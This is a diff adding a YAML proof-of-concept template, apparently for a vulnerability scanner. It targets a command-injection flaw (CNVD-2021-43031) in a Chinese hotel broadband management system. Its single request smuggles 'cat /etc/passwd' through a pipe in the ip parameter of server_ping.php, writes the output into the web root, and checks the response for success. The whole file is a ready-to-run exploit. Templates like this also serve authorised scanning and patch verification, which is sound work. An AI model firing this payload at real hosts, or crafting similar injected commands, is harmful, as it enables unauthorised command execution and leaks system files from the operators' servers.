@@ -1,0 +1,25 @@
+id: poc-yaml-hotel-internet-manage-rce
+info:
+  name: 安美酒店宽带运营系统存在命令执行漏洞（CNVD-2021-43031）
+  severity: high
+  tags:
+  - rce
+  - CNVD-2021-43031
+  finger: 安美酒店宽带运营系统
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../Test.txt&id=1
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/96.0.4664.45 Safari/537.36
+    Accept-Encoding: gzip,deflate
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "parent.doTestResult")
+  output: []
